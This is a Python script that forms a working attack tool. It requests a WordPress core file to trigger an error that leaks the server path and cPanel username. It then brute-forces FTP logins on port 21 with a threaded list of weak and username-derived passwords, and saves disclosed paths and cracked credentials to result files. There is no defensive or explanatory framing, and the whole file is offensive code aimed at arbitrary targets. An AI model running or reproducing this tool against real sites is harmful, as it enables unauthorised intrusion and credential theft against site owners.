import requests, re, socket, ftplib, threading, time

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def CheckFTPport(Target, USername):
    if '/' in USername:
        USername = str(USername).split('/')[0]
    if Target.startswith('http://'):
        Target = Target.replace('http://', '')
    elif Target.startswith("https://"):
        Target = Target.replace('https://', '')
    else:
        pass
    try:
        Ip = socket.gethostbyname(Target)
    except:
        Ip = Target
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect_ex((Ip, 21))
        if connect == 0:
            passwords = [USername, 'FTP@123', 'ftp123', 'password', 'password1', 'fuckyou!', 'ftpftp123',
                         USername + '123', USername + '12', USername + '1', USername + '@!', USername + '!@#',
                         USername + '@ftp', USername + '@2020', USername + '@2019', USername + '@2018',
                         USername + '1997', USername + '2000', USername + '2009', USername + '2019', USername + '2018']
            thread = []
            for password in passwords:
                t = threading.Thread(target=bruteLogin, args=(Target, Ip, USername, password))
                t.start()
                thread.append(t)
                time.sleep(0.1)
            for j in thread:
                j.join()
        else:
            s.close()
    except:
        pass

def bruteLogin(Site, Target, Username, Password):
    try:
        ftp = ftplib.FTP(Target)
        ftp.login(Username, Password)
        with open('result/CrackedFTP.txt', 'a') as XW:
            XW.write('Site: {}\n  IP: {}\n  Username: {}\n  Password: {}\n--------------------------------\n'.
                     format(Site, Target, Username, Password))
        ftp.quit()
    except:
        pass

def Exploit(url):
    if url.startswith('http://'):
        url = url.replace('http://', '')
    elif url.startswith("https://"):
        url = url.replace('https://', '')
    else:
        pass
    try:
        Get_page = requests.get('http://' + url, timeout=10)
        if '/wp-content/' in Get_page.text:
            Hunt_path = requests.get('http://' + url + '/wp-includes/ID3/module.audio.ac3.php', timeout=10)
            def Hunt_Path_User():
                try:
                    find = re.findall('/home/(.*)/public_html/wp-includes/ID3/module.audio.ac3.php', Hunt_path.text)
                    x = find[0].strip()
                    return x
                except:
                    pass

            def Hunt_Path_Host():
                try:
                    find = re.findall("not found in <b>(.*)wp-includes/ID3/module.audio.ac3.php", Hunt_path.text)
                    x = find[0].strip()
                    return x
                except:
                    pass
            Cpanel_username = Hunt_Path_User()
            Path_Host = Hunt_Path_Host()
            if Cpanel_username == None:
                pass
            else:
                CheckFTPport(url, Cpanel_username)
            if Path_Host == None:
                pass
            else:
                with open('result/pwd_WordpressSites.txt', 'a') as X:
                    X.write(url + '  ' + Path_Host + '\n')
    except:
        pass

